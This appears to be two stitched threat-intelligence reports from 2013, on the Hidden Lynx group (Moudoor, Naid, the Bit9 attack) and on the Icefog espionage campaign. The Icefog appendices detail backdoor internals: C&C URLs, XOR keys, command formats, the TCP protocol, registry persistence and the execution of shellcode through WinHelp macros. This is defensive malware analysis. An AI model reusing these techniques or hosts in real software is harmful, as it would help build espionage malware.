Although no zero - day exploit was available , they used a patched Java exploit ( CVE-2011 - 3544 ) effectively to distribute Moudoor from three compromised websites .
This campaign provided the first indications that the group was using both Moudoor and Naid to attack targets and share C & C infrastructure .
Along with this , early links to the attacks on Bit9 began to emerge .
The timeline of this activity is shown in Figure 16 .
In these campaigns , the Hidden Lynx group made heavy use of infrastructure in Hong Kong , with the exception of yahooeast.net .
This is this domain that links to the Bit9 attack , as it resolved to 66.153.86.14 – a C & C server used by the Backdoor .
Hikit sample installed after the successful SQL injection attack on Bit9 .
Moudoor was being actively distributed from these websites for two , four and five months respectively .
These are exceptionally long periods of time to retain access to compromised servers for payload distribution of this nature .
The C & C servers used and the links between the Trojans and Bit9 are shown in Figure 17 .
Team Moudoor heavily relies on a dynamic DNS service called DTDNS to rapidly switch between C & C servers .
In fact , they use direct IP connections or DTDNS exclusively to establish C & C communications , with the exception of yahooeast.net which is a registered domain .
The Hidden Lynx group uses techniques which have clearly been established through experience to maintain this infrastructure for long periods of time .
They adapt quickly and likely have a stockpile of C & C servers that they can quickly switch to which provides maximum uptime during any given operation .
Along with this , the Hidden Lynx group uses several different methods to infect their targets .
In the SCADEF campaign , we saw how the group bundled Moudoor with legitimate software to infect targets .
They also managed to Trojanize software updates as well , as seen in the EASYUPDATE campaign where a Chinese P2P application was observed selectively installing Moudoor since 2011 .
Since November 2011 , the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com .
There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients .
This is , without a doubt , the longest running distribution vector for the group , which infected victims predominantly in China , the United States and Hong Kong .
These are the earliest indications of Moudoor infections , with `` kissnada '' being one of the first DTDNS domains observed in use .
This distribution vector 's exact purpose is still unclear , however it 's certainly linked to the group , as we have observed Moudoor samples in WSDHEALTHY configured to use kissnada58 .
The Hidden Lynx group has left a clear fingerprint for the past two years with clearly identifiable links to the group 's activities .
The use of customized Trojans , shared distribution and C & C infrastructure , coupled with repeated attacks on a predictable set of target organizations has allowed a more complete picture of these attacks to be compiled .
A summary of the links between all of these attacks is presented in Figure 20 .
The following section lists the Trojans that were used by the Hidden Lynx group throughout their various campaigns .
In 2011 , the Hidden Lynx group began to use Backdoor .
Moudoor .
This is a customized version of `` Gh0st RAT '' .
In 2009 , Information Warfare Monitor published a detailed report , `` Tracking GhostNet '' , following an investigation into a cyberespionage network of more than 1,000 compromised computers affecting more than 100 countries .
Many threat actors use customized versions of this RAT for cyberespionage operations .
The team uses Trojan . Naid for special operations .
It first appeared in May 2009 and has been used in many high profile attacks over the past four years .
It shares technical similarities with other Trojans which also originate from China .
All of these Trojans are potentially from the same group or they may source these Trojans from the same developer .
The technical similarities are based on a shared file creation template and C & C protocol .
The other Trojans that share these traits are : • Backdoor . Vasport • Backdoor . Boda File creation template % TEMP % \uid.ax % % TEMP % % \ % s.ax % % TEMP % % \ % s _ p.ax Command and control template POST http : // % ls : % d/ % x HTTP/1.1 Content - Length : 2 CONNECT % ls : % d HTTP/1.1 Connection : keep - alive lynx There is also evidence that Backdoor . Vasport and Trojan .
Naid have shared the same packer to obfuscate the payloads from AV detection .
The obfuscation tool used is also Chinese in origin and has a simple user interface to help pack these Trojans .
Naid also has a history of using stolen digital certificates to overcome trust - based protection when attacking certain hardened targets .
Some of the certificates identified are shown in Figure 22 .
Backdoor . Vasport was delivered by exploiting the Adobe Flash Player CVE-2012 - 0779 Object Type Confusion Remote Code Execution Vulnerability ( CVE-2012 - 0779 ) .
This was delivered in malicious Word documents in targeted attack emails .
The exploit component used in these attacks was also used in the Elderwood Platform .
Table 2 shows the payload from the malicious word documents .
In a more recent campaign called Ladyboyle , Backdoor . Boda was being distributed to take advantage of the Adobe Flash Player CVE-2013 - 0634 Remote Memory Corruption Vulnerability ( CVE-2013 - 0634 ) .
These files were signed with a digital signature from MGAME Corporation , a tactic used previously by the attackers .
Interestingly , Backdoor . Boda and Backdoor . Vasport were both distributed using Flash zero - day exploits in embedded documents .
It 's plausible that the group has a team dedicated to distribution using Flash exploits that customizes Trojans from the same code base that the Naid uses .
The Hidden Lynx group has used cutting - edge attack techniques and a consistent methodology .
Trojan . Naid has been in use since 2009 and Hidden Lynx attacks bear the hallmarks of a campaign that involved yet another Internet Explorer zero - day exploit in December 2009 .
Trojan . Naid was used in the infamous attacks on organizations in the financial , technology , Internet and media sectors called `` Operation Aurora '' .
These attacks are linked with another Trojan called Trojan . Hydraq , but Naid was downloaded in stage three of the operation .
Trojan . Hydraq disappeared from the targeted attack landscape shortly after Operation Aurora , most likely due to the close attention that it was receiving from security researchers .
Trojan . Naid did not meet the same fate , as it is still being used in sophisticated targeted attacks to this day .
Behavior - based detection blocks suspicious processes using the Bloodhound . SONAR series of detections • Norton Safeweb blocks users from visiting infected websites .
Our innovative products and services protect people and information in any environment - from the smallest mobile device to the enterprise data center to cloud - based systems .
Our industry - leading expertise in protecting data , identities , and interactions gives our customers confidence in a connected world .
More information is available at www.symantec.com or by connecting with Symantec at go.symantec.com/socialmedia .
Follow us on Twitter Headquartered in Mountain View , Calif. , @ threatintel Symantec has operations in 40 countries .
More information is available at www.symantec.com .
Visit our Blog http : //www.symantec.com / connect / symantec - blogs / sr For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters Copyright © 2013 Symantec Corporation .
All 350 Ellis St. Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 Copyright 2013 Symantec Corporation .
All rights reserved .
Symantec , the Symantec Logo , and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries .
Other names may be trademarks of their respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
Known targets include governmental institutions , military contractors , maritime and shipbuilding groups , telecom operators , industrial and high - tech companies and mass media .
The name `` Icefog '' comes from a string used in the command - and - control server name in one of the samples .
The command - and - control software is named `` Dagger Three '' , in the Chinese language .
The `` Icefog '' backdoor set ( also known as `` Fucobha '' ) is an interactive espionage tool that is directly controlled by the attackers .
There are versions for both Microsoft Windows and Mac OS X .
In its latest incarnation , Icefog does n't automatically exfiltrate data , instead , it is operated by the attackers to perform actions directly on the victim 's live systems .
During Icefog attacks , several other malicious tools and backdoors were uploaded to the victims ' machines , for data exfiltration and lateral movement .
This document includes a description of the backdoors , other malicious tools , together with remediation information .
During our investigation , we identified several types of exploits being used through spear - phishing e - mails against the targets : > > CVE-2012 - 1856 ( the `` Tran Duy Linh '' ( also see : http : //blog.malwaretracker.com/2013/06/ tomato-garden-campaign-possible.html ) exploit fixed in Microsoft 's MS12 - 060 security bulletin ) > > CVE-2012 - 0158 ( the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft 's MS12 - 027 security bulletin ) > > Web links to Oracle Java exploits ( CVE-2013 - 0422 and CVE-2012 - 1723 ) > > HLP exploits and abuse of features > > HWP exploits The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake `` lure '' document to the victim .
These appear to be the most common methods used by the attackers at this moment .
The victim receives an e - mail with an attachment that is either a Word ( .doc
Upon successful execution , the exploit displays a decoy document featuring a picture of a scantily clad woman : EXAMPLE ' B ' Upon successful execution , this shows a clean , fake `` lure '' document in Japanese titled `` Little enthusiasm for regional sovereignty reform '' : EXAMPLE ' C ' This is a business e - mail in Japanese : The same malware was used to spear - phish multiple targets in Japan .
Another example ( d6c90955c6f2a346c9c91be82a1f9d8c ) looks like this : In addition to Microsoft Office exploits , the Icefog attackers are known to be using Java exploits , hosted online .
For instance , one of the malicious websites used in the attacks was `` money.cnnpolicy.com '' .
The Java exploit downloaded and executed an Icefog dropper from the following URL : www.securimalware [ dot ] net / info / update.exe Note : This website is now SINKHOLED by Kaspersky Lab .
The `` update.exe '' is a standard Icefog dropper , with the following information : Upon execution , it installs the Icefog malware as `` sxs.dll '' in the Internet Explorer folder ( usually `` C : \ Program Files\Internet Explorer '' ) : To receive control , the malware DLL ( `` sxs.dll '' ) uses a technique known as `` DLL search order hijacking '' , which abuses the fact that Internet Explorer will load this file from its own directory , instead of the Windows SYSTEM folder .
The backdoor beams out to the command - and - control server at www.setchon [ dot ] com / jd/ upload.aspx The Icefog attackers are also using HLP files to infect their targets .
The HLP files do not contain exploits but they are abusing certain Windows `` features '' to drop the malware .
It 's interesting to know that Icefog is not the only crew to heavily use HLP `` exploits '' as a part of their toolkit .
Well known , very effective APT like the `` Comments Crew '' / APT1 , have included the HLP trick in their kits , along with other lesser known crews .
This HLP format is an older one , known as `` Winhelp '' , which was natively supported up until Vista and Windows 7 , when Microsoft shipped a separate Winhlp32.exe component to help phase out the technology .
Most likely , the choice to abuse Winhelp indicates that the attackers have an idea of what version operating systems they are attacking .
In very conservative terms , this implementation of HLP files is not an `` exploit '' , but instead , abuse of a poorly constructed Windows Help feature .
Code and data is mixed in this file format , and the Icefog attackers abused it with custom macros .
A fine description of `` custom macros '' and the risks of building them in to WinHelp projects is provided by Ruben Santamarta : http : //reversemode.com / index2.php ? option = com_content & do _ pdf=1 & id=4 EXAMPLES Let 's take a quick look at an example of how the Icefog attackers abused the provided WinHelp functionality by examining the relevant custom macros , API calls and shellcode .
This sample uses standard Win32 API to allocate memory with the execution flag set , copies ( using long string copy ) XOR'ed `` shellcode '' and calls CreateThread to transfer execution to the malicious payload .
In the screenshot above , `` RR '' means RegisterRoutine .
After registration , one can simply call the respective function .
Next , the sample allocates memory with execution flag , and copies XOR'ed `` shellcode '' .
To execute the code , a simple call to CreateThread ( ) suffices : The shellcode is encrypted with a simple 0xBF XOR operation : Upon execution , the shellcode installs an Icefog backdoor that communicates with the C2s at : '' www.samyongonc [ dot ] com / jd / upload.aspx '' and `` www.625tongyi [ dot ] com / jd / upload.aspx '' During our investigation , we observed Icefog attacks using HWP files .
These are document files used by the Hangul Word Processor .
According to Wikipedia , Hangul ( also known as Hangul Word Processor or HWP ) is a proprietary word processing application ( link to : http : //en.wikipedia.org/ wiki / Hangul _ ( word_processor ) ) published by the South Korean company Hancom Inc .
It is used extensively in South Korea , especially in the government sector .
Unfortunately , we were not able to obtain any of these files , although they were used to successfully attack and infect victims .
Users of HWP should be aware of these exploits and update their Hangul Word Processor installation to the most recent version .
The attack is initiated through spear - phishing e - mails , taking advantage of multiple known ( already patched ) vulnerabilities .
Once they successfully infect a machine , the operators perform several basic functions to identify and confirm the nature of the victim : > > List folders on disk such as `` My Documents '' and the Desktop .
If the victims looks `` genuine '' ( they avoid working with virtual machines and `` fake '' victims ) they further deploy additional software , including : > > Type `` 2 '' backdoors that use a newer protocol for communication .
We have documented three main types of stolen data : > > Windows address books , .WAB
If stolen information represents large files , they are compressed with the popular tool WinRAR ( split into volumes ) or CABARC and transferred to the command - and - control part by part .
Several known variants of the Icefog backdoor are known to exist .
We list these as following : > > The `` old '' 2011 Icefog - which sends stolen data by e - mail ; this version was used against the Japanese House of Representatives and the House of Councillors in 2011 .
Back in 2011 , we analyzed malware samples that were used to attack several Japanese organizations .
Among of the attacked organizations were the Japanese `` House of Representatives '' and the `` House of Councilors '' .
Both samples beacon out to the C & C at `` www.cloudsbit.com '' , although to different scripts : `` /dj/ upload.aspx '' and `` /jd2web / upload.aspx '' .
In addition to the normal command - and - control mechanism , these older samples feature another capability , which involves e - mail accounts on AOL.COM : harrypottercommand001 @ aol.com jd2command092 @ aol.com jd2clientsend @ aol.com woshihero009 @ aol.com mrmylcmd009 @ aol.com defaultmail002 @ aol.com The malware has the ability to connect to these accounts by POP3 and fetch commands from the mailbox .
It also has the ability to send stolen data by e - mail , by contacting smtp.aol.com and sending e - mail messages directly .
Here 's what such a session looks like : One of the samples used in the attacks drops a `` lure '' photo depicting a Japanese audience : Of the e - mail accounts used by the backdoor , one of them was interesting : woshihero009 [ at ] aol.com Back in August 2011 , when these attacks took place , this mailbox had several hundred e - mails with stolen information from the victims .
Interestingly , their address book contained a number of e - mail addresses to which e - mails were forwarded and were automatically added to the address book .
The Icefog type `` 1 '' backdoor is a remotely controlled Trojan that supports a variety of functions .
Versions of this backdoor are available for Microsoft Windows and Mac OS X .
It has the ability to : > > Hijack and upload basic system information to C & C servers owned and controlled by the attackers .
For a technical description of the type `` 1 '' Icefog backdoor , see Appendix B .
The type `` 2 '' Icefog backdoor is very similar to type 1 .
However it uses a proxy server for the commands .
This behavior relies on a set of ASP scripts , which act as a buffer between the real C & C backend and the victim .
It offers another level of anonymity to the attackers , as it can be controlled ( for instance ) via Tor or another anonymizing method .
We have n't observed the use of Type `` 2 '' backdoors directly against the victims .
Instead , the type '' 2 '' backdoor is used as an upgrade to Type `` 1 '' infections , together with a special loader tool .
It uses a script named `` alive.asp '' for most of the operations .
Type `` 2 '' Icefog exists as shellcode files , usually named `` msuc.dat '' .
These are loaded through the use of a special tool .
Loaders : In terms of functionality , type `` 2 '' Icefog is similar to type `` 1 '' .
The only difference is that the malware does not have persistence in the system and disappears after reboot .
Although we do n't have samples of these variants , we observed and sinkholed a certain kind of Icefog - related command - and - controls that use a different communication method ; we suspect there are victims that are infected with this malware .
Type `` 3 '' Icefog uses scripts named `` view.asp '' and `` update.asp '' .
Known C & C URLs : www.krentertainly [ dot ] net / web / view.asp disneyland.website.iiswan [ dot ] com / web / view.asp Type `` 4 '' Icefog uses scripts named `` upfile.asp '' .
Known C & C URL : www.pinganw [ dot ] org / sugers / upfile.asp - SINKHOLED by Kaspersky Lab ) We continue to look for these variants and will update the paper when or if they are identified .
Type `` NG '' Icefog is the most recent version of this backdoor .
It is designed to communicate directly with a command - and - control software that runs on Microsoft Windows computers .
For a thorough technical description of the type `` 1 '' Icefog backdoor , see Appendix C. In late 2012 , the Icefog attackers experimented with a Mac OS X version of Icefog .
This particular version of the malware was seeded in a number of Chinese BBS forums and masked as a graphic application .
Here is an example : http : //bbs.pcbeta.com / forum.php ? mod = viewthread & tid=1157944 & page=1 # pid30109870 On 19 October 2012 , the user `` appstoer '' advertised an application named `` Img2icns.rar '' .
The archive contains a Mac OS X application that drops and installs the Macfog malware .
We were able to find two such archives , but there are probably more .
The malicious modules have the following identification data : The Macfog backdoor is a 64-bit Apple Mac OS X Mach - O executable , compiled with the LLVM Clang package .
It uses the type `` 1 '' C & C servers protocol to communicate and has the same capabilities as the Windows version .
We are including a brief description below ; a full description of the malware is available in Appendix D : MACFOG : SUMMARY DESCRIPTION The Macfog backdoor is very similar to its Win32 siblings .
It collects unique system information and POSTs this data to a hardcoded URL : hxxp : //appst0re.net / upload.aspx ? filepath= % order / ok / arbitrary name % & filename= % hostname % .jpg
The backdoor is capable of familiar functionalities : system information collection , communication over HTTP with the C & C , download and upload files and execute system commands .
The Macfog backdoor is different from the Windows variant from the point of view of usage by the attackers .
So far , we have n't identified victims of targeted attacks being infected with it , although we do believe they exist .
The seeding of this version through Chinese bulletin boards resulted in a few hundred infections worldwide .
We believe this could have been a beta - testing phase for Mac OS X versions to be used in targeted attacks later .
The attackers rely on a multitude of lateral movement tools that are deployed to the victims through the command - and - control servers .
The tools we observed cover a variety of functions , such as dumping Windows user credentials , Outlook and Internet Explorer saved passwords , and the gathering of system information .
One of the servers we analyzed had an open folder where some of the filenames of the lateral movement tools were still visible , although most were truncated to 0 by the C & C upon successful execution on the victim : A description of some of the tools we observed follows : In addition to these , several other tools were observed but not recovered .
For instance , on one of the victim machines , we observed what appeared to be the use of a Kernel exploit through a Java application for escalation of privileges .
Unfortunately , we do not know if it was a zero - day kernel vulnerability because the file was deleted by the attackers after being used .
During our research , we observed multiple Icefog command and control servers .
Most of them were on shared hosting platforms , however , some of them , which were of greater importance to the attackers , were also using dedicated hosting .
Perhaps one of the most important aspects of the Icefog C & Cs is the `` hit and run '' nature .
The attackers would set up a C & C , create a malware sample that uses it , attack the victim , infect it , and communicate with the victim machine before moving on .
The shared hosting would expire in a month or two and the C & C disappears .
The nature of the attacks was also very focused - in many cases , the attackers already knew what they were looking for .
The filenames were quickly identified , archived , transferred to the C & C and then the victim was abandoned .
Based on the C & C names , we were able to identify several Icefog campaigns that were active between 2011 - 2013 .
From the timeline above , it seems the attackers increased the number of campaigns in 2013 compared to previous years , although it 's possible that malware and artifacts used in earlier years are no longer available .
Hence , the chart probably represents only a fraction of the attackers ' activity during the past years .
We identified four types of Icefog C & C servers - type `` 1 '' , `` 2 '' , `` 3 '' and type `` 4 '' .
Also , there is a fifth , standalone type of C & C , used for Icefog - NG , which runs as a Windows desktop application .
The type `` 1 '' C & C server uses a full web backend that lets the attacker directly control the victims via a web browser .
The type `` 1 '' C2 backend is written in ASP.NET .
The type `` 2 '' C & C server backend we identified acts as a virtual , custom proxy between the attackers and the victims .
It is written in ASP and is extremely simplistic in operation .
This is more effective as it conceals the attacker 's identity .
The second type of C2 works in conjunction with a control tool , probably running directly on the attacker 's PC .
The type `` 3 '' C & C server ( used in the `` starwings '' and `` disneyland '' campaigns ) appears to be experimental and features only two basic functions : view and update .
Its exact workings are unknown and we have n't been able to locate the Icefog malware that uses it .
The type `` 4 '' C & C server was identified through sinkholing of the domain `` pinganw [ dot ] org '' .
Just like type `` 3 '' , the exact workings are unknown and we have n't been able to locate the Icefog malware that uses it .
The Icefog - NG C & C server is a Windows desktop application which does n't require a web server and works as a standalone TCP server , which by default listens on port 5600 .
Our analysis focuses on type `` 1 '' C & C servers , which are the most popular and have been used in most of the attacks we observed .
Here 's a look at the type `` 1 '' command - and - control server login screen : The command - and - control script ( `` control.aspx '' ) features an interesting comment '' shiyanlllllllllllllllllllllllllll '' .
The page title is `` 尖刀三号 '' , which means `` Dagger Three '' in Chinese .
For martial arts fans , the `` 尖刀三号 '' is quite similar to `` 三尖刀 '' , which is an ancient Chinese weapon .
The Type `` 1 '' C2 interface is written in ASP.NET and features an easy to use interface to communicate with and manage the victims : This control panel is actually a Visual Basic . NET web application with the following structure : The application uses the native filesystem as the main storage to save stolen data , logs and temporary files .
Below is short description of directories used by the C & C application : Perhaps the most interesting part is that the type `` 1 '' C & C panel maintains a full history of the attacker 's interaction with the victims .
This is kept as an encrypted logfile , in the `` logs '' directory on the server .
In addition to that , the server maintains full interaction logs and command execution results from each victim .
Below we can see an example of the attackers copying a number of files to `` c : \temp\mslog '' from an USB flash drive connected to the computer with Korean Windows systems and preparing them for upload to the C2 : In another example , we can see them uploading and running a type `` 2 '' backdoor on top of the type '' 1 '' infection : Interestingly , the modern Icefog - NG C & C application looks very similar to Icefog Web UI - it uses the same multi - tab layout and even has the same tab titles .
We believe that Icefog - NG was developed by the same author to replace Icefog bot and the web - based Control Panels .
Icefog - NG was designed to be more responsive and convenient to the operator .
The data storage is the same - local filesystem , and even the file names are the same as on the previous Icefog version .
Here is a screenshot of the user interface from the Icefog - NG C & C application .
Like with the web - based Icefog , this C & C application requires authorization of the operator .
While in the web version it made sense to authenticate remote users to restrict access to the Control Panel , the desktop application authentication is easily bypassed , because the login and password are hardcoded in the binary .
Here 's a look at the `` victims '' panel in the Icefog - NG C & C software : One curious fact about Icefog - NG is that it is usable only if you have screen resolution set at 1280x1024 or higher .
Even on standard 1024x768 , not all controls fit into screen .
The application was created using Microsoft Visual Studio MFC AppWizard .
Although , the sample we analyzed was compiled in May 2013 , the project was most likely started in 2012 , which is stated in the '' About Application '' message box .
This date is put automatically by the AppWizard when the code is generated for the first time .
The command - and - control servers maintain full logs of the victims together with the various operations performed on them by the C & C operators .
These logs are encrypted with a simple XOR operation and available to anyone who knows their location and name on the server .
Here 's what a decoded log looks like : These logs can sometimes help to identify the targets of the attacks and in some cases , the victims .
During our research , we observed attacks against a number of targets in South Korea , Taiwan and Japan .
These include defense industry contractors such as Lig Nex1 and Selectron Industrial Company , shipbuilding companies such as DSME Tech , Hanjin Heavy Industries , telecom operators such as Korea Telecom , media companies such as Fuji TV and the Japan - China Economic Association .
During our research , we managed to sinkhole 13 domains used by the attackers : > > spekosoft.com > > kechospital.com > > unikorean.com > > pasakosoft.net > > chinauswatch.net > > msvistastar.com > > defenseasia.net > > pinganw.org > > kevinsw.net > > avatime.net > > shinebay.net > > securimalware.net - used in spear - phishing attacks > > appst0re.net - MacFog 's command - and - control All of them have been redirected to the Kaspersky Sinkhole server at 95.211.172.143 .
Overall , during the monitoring period , we observed connections from several victims , based in South Korea , Japan , Taiwan , Germany and some other countries .
For Windows based computers , we have the following statistics : .
For Macfog , the Mac OS X version of the backdoor , we have the following statistics : Overall , we ' ve observed over 4500 IPs with infected Macfog hosts , belonging to more than 430 unique victims .
For Windows - based machines , our sinkhole received connections from almost 200 unique IPs , in six countries .
It should be noted that in terms of the overall picture , these sinkholed domains offer a view of only a fraction of the infected computers , especially old infections which for some reason have not yet been disinfected .
The newer attacks are more difficult to track because they use new C & C domains that ca n't be easily sinkholed .
Another important note relates to geographical distribution of victims .
While we see many connections coming from China , this does n't mean that it has victims of targeted attacks .
Because the Macfog samples that we have seen are being distributed in a trojanized bundle with legitimate software on publicly available Chinese message boards , visitors ( especially those who read Chinese ) from any country in the world could get infected .
We believe that a primary goal of doing that was to test malware in different environments and evaluate its efficiency .
That explains why the domain used as C2 was abandoned - random victims had less value for the attackers .
Based on the more reliable analysis of the C & C servers used in the targeted attacks , spearphishing examples and other data collected during our research , we believe that the primary targets of the Icefog operations were in South Korea and Japan .
Based on the list of IPs used to monitor and control the infrastructure , we assume some of the threat actors behind this operation are based in at least three countries : > > China ( the largest number of connections ) > > South Korea > > Japan More information on attribution is available in our private report for governments .
The Icefog Type `` 2 '' backdoor loader with MD5 `` be043b0d1337f85cfd05f786eaf4f942 '' , found on the C2 domain `` infostaition.com '' has the following debug path inside : '' C : \Users\yang.zc\Desktop\代码片调用程序 4\Release\UCCodePieceGo.pdb '' Note that `` Yang.zc '' appears in both strings .
The string `` 代码片调用程序 4 '' translates to `` Piece of code calling 4 '' from Chinese .
One of the C & C backend control scripts ( control.aspx ) has the page title `` 尖刀三号 '' , which means '' Dagger Three '' in Simplified Chinese .
The ASPX server - side scripts contain a number of messages and code comments in Chinese : One of the lateral movement tools used by the attackers has a Chinese name : windows版本号.txt.jpg - `` windows version.txt.jpg '' Unauthenticated C & C login attempts to access the command - and - control user interface result in redirects to ' sohu.com ' : More information is available in our private report for governments .
These IPs are known to point to dedicated hosting servers .
This paper describes `` Icefog '' , a small APT group which focuses on targets in South Korea and Japan .
The operation appears to have started in 2011 and increased in size and scope during each year .
Based on the victim profiles , the attackers appear to have an interest in the following sectors : Despite their relative lack of complexity , the attackers have successfully compromised targets belonging to these categories , with the largest number of victims being in South Korea .
The Icefog attackers have both Windows and Mac OS X backdoors at their disposal .
The Mac OS X backdoor currently remains largely undetected by security solutions and has managed to infect several hundred victims worldwide .
The `` hit and run '' nature of this operation is one of the things that make it unusual .
While in other cases , victims remain infected for months or even years , and data is continuously exfiltrated , the Icefog attackers appear to know very well what they need from the victims .
Once the information is obtained , the victim is abandoned .
During the past years , we observed a large increase in the number of APTs which are hitting pretty much all types of victims and sectors .
In turn , this is coupled with an increased focus on sensitive information and corporate cyber - espionage .
In the future , we predict the number of small , focused APT - to - hire groups to grow , specializing in hit - and - run operations , a kind of `` cyber mercenaries '' of the modern world .
Recommendations on how to stay safe from such attacks ( for both Windows and Mac OS X users ) : > > Update Java to the most recent version or , if you do n't use Java , uninstall it .
So far , we have n't observed the use of zero - day vulnerabilities by the Icefog group ; to defend against those , although patches do n't help , technologies such as AEP ( Automatic Exploit Prevention ) and DefaultDeny can be quite effective .
The module is a non - packed Win32 PE DLL file compiled in Microsoft Visual C++ 8.0 .
The module installs at % WinDir % \wdmaud.drv and is automatically loaded by explorer.exe on startup .
This technique is known as `` DLL search order hijacking '' , and abuses the fact that Windows Explorer will load this file from its own directory first , instead of the Windows SYSTEM folder .
It communicates with the C & C server at ' icefog.8.100911.com ' ( 211.42.249.39 ) and passes collected information about victim , lets the operator download or upload files to and from the victim machines , execute system commands on the infected machines as well as execute additional malware components .
After the DLL is loaded , it creates system mutex named `` myhorse_macfee '' .
If such mutex already exists , the module quits to avoid duplicate instances from running .
After that , it loads % WinDir % \wdmaud.drv ( this DRV is loaded by explorer.exe on startup ) and calls exported mymainfunc of its own module that creates a new thread responsible for the communication with C & C .
The spawned thread collects information about the system such as user names , machine names , IP addresses , running processes , proxy settings , Windows versions , etc .
It produces a report that is later submitted to the C & C server .
An example for such a report is shown below : This information is then written to the file at % TMP % \tmp.dat .
Then , it checks if the % TMP % \msuc.dat file exists .
If it exists , the module creates a new thread that will load the file contents into memory and pass execution flow to the first byte of the loaded data in memory .
The contents of the tmp.dat is converted to wide char and XORed with key `` * & ~^ % @ 0hh8979 '' .
Immediately after , it is sent via HTTP/1.1 POST request to ' icefog.8.100911.com ' on port 80 .
The full query string is the following : Full HTTP headers : Connection : Keep - Alive Cache - Control : no - cache The module attempts to get ' icefog.8.100911.com/news/order/ < HOSTNAME > _ < HOSTIP > .jpg '
The response is saved to file % TMP % \order.dat The content of order.dat is converted from widechar to multibyte string and is parsed for the following command strings : If any of the commands above is found , the Trojan notifies the C & C that the command was received by issuing the following POST request : Full HTTP/1.1 headers : The cmd command expect a payload string ( < COMMAND > ) following the `` cmd _ '' prefix , so that the full command syntax looks like this : cmd _ < COMMAND > .
It creates a new process with command line C : \windows\system32\cmd.exe /c < COMMAND > However , if < COMMAND > contains output redirection character `` > '' , the executed command line will be as following : After the process has finished its stdout output is sent to the C & C via The command - line output is converted to wide - char string and XORed using `` * & ~^ % @ 0hh8979 '' string as the key .
The command string format must be as following : upload _ < FILEPATH > _ < FILENAME > It attempts to fetch icefog.8.100911.com/news/order/ < FILENAME > using user agent mydownload and saves the response to the local path specified in < FILEPATH > .
After that it notifies the C & C by sending Full HTTP/1.1 headers : Download command format must be The < LOCALPATH > \ < FILENAME > file is opened and its content is prepared for uploading by converting ANSI data to Unicode and XORing using key `` * & ~^ % @ 0hh8979 '' .
The result is saved to % TMP % \tmpxor.dat ' The tmpxor.dat is uploaded via POST request to ' icefog.8.100911.com ' at port 80 .
Full HTTP/1.1 headers : The code command format must be code _ < FILENAME > A new thread is created that loads a local file , specified in < FILENAME > , to memory and passes the execution to the first byte of the loaded data .
If no known command is parsed out of the server response , the Trojan notifies the server about being alive by issuing the following HTTP POST request : After that it sleeps for 150 seconds and starts the command - processing loop again .
In addition to the web - based Icefog malware samples , we have come across a variant of the Icefog bot which is based on a custom protocol working over a TCP session ( port 5600 TCP ) with its own desktop application that serves as a command - and - control center .
For reference , we called it Icefog - NG ( New Generation ) .
We believe that the new generation of Icefog was created to improve bot response and to increase the efficiency of operations .
The previous web - based version of the bot had significant time lag during operation ( up to 40 seconds ) , the new generation bot was created to solve the time lag issue .
The module is a non - packed Win32 PE Executable file compiled in Microsoft Visual C++ 2005 .
It is a backdoor that is capable of collecting system information , download and upload files , execute commands .
To enable automatic start during system boot , the malware adds and uses the following system registry value : HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load= '' % TMP % \msloger.exe '' During start it checks if a file named `` % TMP % \~AA.tmp '' exists .
If yes , it copies the file to % TMP % \ hwp.hwp .
Next it kills processes named `` hwp.exe '' and then opens `` hwp.hwp '' .
This is important step during first malware run which opens a decoy .hwp
This shows that the malware was designed to be installed from .hwp
Then it copies `` % TMP % \~Ab.tmp '' to `` % TMP % \msloger.exe '' .
After that the malware registers on the C & C .
To do that , the malware connects to www.kreamnnd .
The data is encrypted using XOR with key `` & * ^ * @ ~^ % 9 ? i0h '' .
If the connection with C & C is lost the bot can re - establish the session by sending [ Total message size : DWORD ] XT [ Hostname length : WORD ] [ HOSTNAME ] _ [ IPADDR ] After connecting to the C & C and sending the registration message the bot expects commands from the server .
These commands are described below .
This command is used to execute a command line .
The message has the following format : [ Total Message Size : DWORD ] SC [ COMMAND ] The bot checks if the COMMAND contains `` sleep '' then it sleeps for the specified time after `` sleep '' substring .
Otherwise , a new cmd.exe processes is spawned to execute the COMMAND .
If the command does not contain `` > '' the output will be directed to % TMP % \cmd1.dat and the result will be sent to the C & C automatically using the following format : [ Total Message Size : DWORD ] [ cmd1.dat data ] The % TMP % \cmd1.dat is deleted after the file is sent to the C & C .
This command is used to download a file from the victim machine .
The message has the following format : [ Total Message Size : DWORD ] DL [ FILEPATH ] The server expects the bot to send a response message with the file size from victim bot [ Total Message Size : DWORD ] OK [ File Size : DWORD ] Then the server sends an acknowledgement message to the victim bot [ Total Message Size : DWORD ] OK The bot encrypts the contents of the file and saves it to % TMP % \mstmpdata.dat .
After that part it sends mstmpdata.dat file split in chunks of 0x4ffc each ( the last one may be shorter than 0x4ffc ) .
Here is the format of that message : [ Total Message Size : DWORD ] [ File data no longer than 0x4ffc ] The last message is repeated containing the next chunk of the file until end of file is reached .
This command is used to upload a file from the C & C to the bot .
The format of this command is the following : [ Total Message Size : DWORD ] UP [ File Size : DWORD ] [ Data Chunk Size+Total Message Size field length , a hardcoded value of 0x5000 : DWORD ] [ File Name ] The server expect an OK message from the bot [ Total Message Size : DWORD ] OK Then C & C sends the first part of the file .
It has been distributed on various Internet message boards and forums as an application called `` Img2icns '' .
There are two known malicious bundles , one contains the launcher and the backdoor modules , and another contains the dropper and the backdoor modules .
Once the user executes the malicious application bundle , the backdoor is copied to the user 's directory and the legitimate application is started as if there was no added malicious code .
The module is written in Objective C language and contains 4 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload .
The latter three classes seem to be included from the backdoor 's source code but not used .
All functionality is implemented in the function `` AppDelegate - ( void ) applicationDidFinishLaunching : ( i d ) '' .
